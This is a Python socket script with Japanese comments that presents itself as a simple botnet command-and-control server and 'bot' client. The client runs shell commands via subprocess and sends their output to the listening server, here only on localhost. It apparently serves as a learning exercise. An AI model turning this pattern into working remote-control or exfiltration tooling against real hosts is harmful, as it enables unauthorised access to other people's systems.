import socket
import subprocess

#サーバモード関数
def server():
    
    IP = '0.0.0.0'
    PORT = 9998
   
    #IPv4とTCPのソケットを作成
    server = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
    #サーバのIPアドレスとポートの設定
    server.bind((IP, PORT))
    
    server.listen()
    #C&Cserverが待ち受けている
    print(f'[*] listen中...{IP}:{PORT}')
    #socketの中身を表示
    print(f'[*] listen_socket {server}')
    
    while True:
        #クライアント側の接続を待ち受ける
        client, address = server.accept()
        #接続してきたクライアントのソケットを表示
        print(f'接続したクライアント側ソケット:{client}')
        #接続してきたクライアントのIPアドレスとポート番号を表示
        print(f'接続したIPアドレスとポート番号:{address}')
        
        #接続したクライアントにまず、「welcome to C&Cserver!!!」を送る
        #socket通信でデータを送る場合は「b'文字列'」でbyteにエンコードする
        client.send(b'welcome to C&Cserver!!!')
        
        #socket(クライアント側の).recvメソッドでクライアントからデータを受信し、それをrequest変数に代入する
        request = client.recv(1024)
        #受信したデータをbyteからutf-8でデコードする
        print(f'[*] Received: {request.decode("utf-8")}')
        
    return
        


#クライアントモード関数
def con():
    while True:
        target_host = "127.0.0.1"
        target_port = 9998
        
        
        print('end or connect')
        
        print(':')
        num = input('>> ')
        if num == 'connect':
            #ソケットオブジェクトの生成
            client = socket.socket(socket.AF_INET, socket.SOCK_STREAM)

            #サーバーへ接続
            client.connect((target_host,target_port))
            
            while True:
                command_select = input('select command>> ')
                
                #lsやipconfig等の一つのコマンドを実行するときに使う
                if command_select == 'single':
                    argument_single = input('[*]argument_single>> ')        
                    #botが侵入したディレクトリのファイル名をサーバーに送信
                    #subprocess.check_output(コマンド)でコマンドの実行結果を出力
                    #今回はwriting変数に出力結果を挿入
                    writing = subprocess.check_output(argument_single)
            
                    #サーバ側にデータを送る
                    #subprocess.check_outputでの出力結果は既にbyte型になっているため、サーバに送る際はエンコードしなくても良い            
                    client.send(writing)
                    response = client.recv(4096)
                    print(response.decode())
            
                elif command_select == 'double':
                    #botが侵入した標的で実行するコマンドを入力
                    argument_1st = input('[*]1st_argument>> ')
                    argument_2th = input('[*]2th_argument>> ')
                    print(f'bot@$~ {argument_1st} {argument_2th}')
                    #コマンドを実行し出力結果をcommand変数に代入
                    command = subprocess.check_output([argument_1st, argument_2th])
                    #コマンドの出力結果(command)をサーバに送信
                    client.send(command)
                
                elif command_select == 'end':
                    break
                
                else:
                    print('input [single] or [double].')
                
            #endコマンドを実行し、while Trueを抜けたあと、ソケットを切断する        
            client.close()

        #ヘルプを表示
        elif num == 'help':
            print('help : 使用できるコマンド')
            print('connect : サーバと接続する')
            print('end : クライアントモード終了')
            
        elif num == 'end':
            break
            
        else:
            print('不正なコマンド')
    return
    

def main():
   while True:
       
       command = input('>> ')
       if command == 'client':
       #clientモード関数を呼び出す
           con()
       
       elif command == 'server':
       #serverモード関数を呼び出す
           server()
           
       elif command == 'end':
           #while trueを抜ける
           break
       
       elif command == 'help':
           print('client : クライアントモード')
           print('server : サーバモード')
           print('end : プログラム終了')
           print('help : ヘルプ表示')
           
       else:
           print('不正なコマンド')
           

if __name__ == '__main__':
    main()
